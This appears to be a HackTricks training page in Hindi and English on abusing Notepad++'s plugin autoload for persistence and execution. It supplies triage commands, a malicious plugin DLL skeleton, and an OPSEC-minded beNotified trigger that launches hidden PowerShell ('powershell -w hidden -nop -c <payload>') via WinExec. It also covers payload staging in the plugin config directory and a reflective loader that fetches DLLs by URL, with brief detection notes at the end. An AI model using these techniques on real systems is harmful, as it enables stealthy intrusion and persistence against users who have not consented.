# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ लॉन्च होने पर अपने `plugins` सबfolders के अंदर मिले हर plugin DLL को **autoload** करेगा। किसी malicious plugin को किसी भी **writable Notepad++ installation** में डालने से हर बार editor शुरू होने पर `notepad++.exe` के अंदर code execution मिल जाता है, जिसका उपयोग **persistence**, stealthy **initial execution**, या अगर editor elevated होकर लॉन्च हो तो **in-process loader** के रूप में किया जा सकता है।

**Notepad++ 7.6+** से अपेक्षित manual-install layout है **हर plugin के लिए एक subfolder** (`plugins\<PluginName>\<PluginName>.dll`). **portable mode** में (`notepad++.exe` के साथ `doLocalConf.xml` मौजूद होने पर), पूरा application tree उसी directory के भीतर local रहता है, जिससे अक्सर copied/admin tool bundles एक आसान user-writable execution surface बन जाते हैं।

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (आमतौर पर write करने के लिए admin चाहिए).
- Low-privileged operators के लिए writable options:
- **portable Notepad++ build** को user-writable folder में use करें।
- `C:\Program Files\Notepad++` को user-controlled path (जैसे `%LOCALAPPDATA%\npp\`) में copy करें और वहाँ से `notepad++.exe` चलाएँ।
- ऐसे **admin tool bundles**, extracted zip copies, या help-desk toolkits खोजें जिनमें पहले से `doLocalConf.xml` हो और जो `Program Files` के बाहर हों।
- हर plugin को `plugins` के नीचे अपना अलग subfolder मिलता है और वह startup पर automatically load होता है; menu entries **Plugins** के under दिखती हैं।

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ विशिष्ट **exported functions** की अपेक्षा करता है। ये सभी initialization के दौरान कॉल होते हैं, जिससे कई execution surfaces मिलते हैं:
- **`DllMain`** — DLL load होते ही तुरंत चलता है (पहला execution point).
- **`setInfo(NppData)`** — load पर एक बार कॉल होता है ताकि Notepad++ handles दिए जा सकें; menu items register करने की सामान्य जगह।
- **`getName()`** — menu में दिखने वाला plugin name लौटाता है।
- **`getFuncsArray(int *nbF)`** — menu commands लौटाता है; भले ही empty हो, startup के दौरान यह कॉल होता है।
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla events प्राप्त करता है (user action या editor event तक payloads defer करने के लिए उपयोगी)।
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, बड़े data exchanges के लिए उपयोगी।
- **`isUnicode()`** — load के समय checked होने वाला compatibility flag।

अधिकांश exports को **stubs** के रूप में implement किया जा सकता है; execution `DllMain` या ऊपर दिए गए किसी भी callback से autoload के दौरान हो सकता है।

## Minimal malicious plugin skeleton
एक DLL compile करें जिसमें अपेक्षित exports हों और उसे writable Notepad++ folder के अंदर `plugins\\MyNewPlugin\\MyNewPlugin.dll` में रखें:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. DLL बनाएं (Visual Studio/MinGW).
2. `plugins` के तहत plugin subfolder बनाएं और DLL को उसके अंदर डालें।
3. Notepad++ को restart करें; DLL automatically load हो जाती है, `DllMain` और subsequent callbacks execute होते हैं।

## `beNotified` के जरिए low-noise trigger pattern
OPSEC के लिए, कई payloads को **DllMain** से fire **नहीं** करना चाहिए। एक quieter pattern यह है कि plugin को cleanly load होने दें, फिर केवल एक realistic editor event, जैसे **startup complete**, **buffer activation**, या **पहला typed character**, के बाद execute करें।
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
यह noisy `DllMain` beacon की तुलना में public offensive research से बेहतर मेल खाता है: DLL अभी भी startup पर autoload होती है, लेकिन malicious action तब तक delay रहती है जब तक Notepad++ genuinely in use न लगे।

## plugin config directory का secondary storage के रूप में उपयोग
Notepad++ `NPPM_GETPLUGINSCONFIGDIR` expose करता है, जो **current user's plugin configuration directory** लौटाता है। एक malicious plugin इसका उपयोग करके on-disk DLL को minimal रख सकता है, जबकि encrypted config, staged payloads, या tasking files को ऐसे path में store कर सकता है जो normal plugin state के साथ blend in हो।
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
ऑपरेशनल रूप से यह उपयोगी है जब आप चाहते हैं:
- एक छोटा autoloaded bootstrap DLL;
- main plugin binary को फिर से छुए बिना per-user tasking;
- **autoload trigger** को भारी second stage से अलग करना।

## Reflective loader plugin pattern
एक weaponized plugin Notepad++ को **reflective DLL loader** में बदल सकता है:
- एक minimal UI/menu entry प्रस्तुत करें (उदा., "LoadDLL").
- एक **file path** या **URL** स्वीकार करें ताकि payload DLL fetch की जा सके।
- DLL को current process में reflectively map करें और एक exported entry point invoke करें (उदा., fetched DLL के अंदर एक loader function).
- लाभ: नया loader spawn करने के बजाय benign-looking GUI process का reuse; payload को `notepad++.exe` की integrity inherit होती है (elevated contexts सहित).
- Trade-offs: disk पर एक **unsigned plugin DLL** drop करना noisy होता है; एक practical variation यह है कि autoloaded plugin को सिर्फ एक stub के रूप में use करें और real implant को encrypted/staged कहीं और रखें।

## Detection and hardening notes
- **Notepad++ plugin directories** में writes block या monitor करें (user profiles में portable copies सहित); controlled folder access या application allowlisting enable करें।
- `plugins` के अंदर **new unsigned DLLs**, portable Notepad++ trees में changes, और `notepad++.exe` से होने वाली unusual **child processes/network activity** पर alert करें।
- legitimate plugins का baseline बनाएं और किसी भी नई DLL की जांच करें जो normal Notepad++ plugin interface export करती हो लेकिन साथ ही shells, PowerShell, या network beacons भी spawn करती हो।
- plugin installation केवल **Plugins Admin** के माध्यम से enforce करें, और untrusted paths से portable copies के execution को restrict करें।

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
